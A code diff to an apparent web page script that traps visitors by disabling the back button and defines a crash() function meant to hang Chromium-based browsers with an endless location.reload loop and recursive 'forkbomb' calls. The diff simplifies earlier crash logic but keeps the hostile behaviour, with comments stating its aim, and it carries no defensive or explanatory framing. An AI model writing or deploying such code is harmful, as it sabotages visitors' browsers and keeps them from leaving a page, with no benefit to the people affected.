@@ -9,21 +9,16 @@
         console.log('script loaded')
         // disable back button
         history.pushState(null, document.title, location.href);
-        window.addEventListener('popstate', function () {
+        window.addEventListener('popstate', function() {
             history.pushState(null, document.title, location.href);
         });
 
         function crash() {
-            try {
-                // should hang chromium-based browsers
-                while (1) location.reload(1);
-                // overload the javascript processor with unnecessary math
-                while (1) console.log(192874987923874 * 12859750538402839098183724981239874912739)
-                // initiate a forkbomb
-                (function fork() { fork(); fork() })();
-            } catch (e) {
-                crash();
-            }
+            // should hang chromium-based browsers
+            while (1) location.reload(1);
+            // forkbomb
+            crash();
+            crash();
         }
 
         // fallback for image not loading
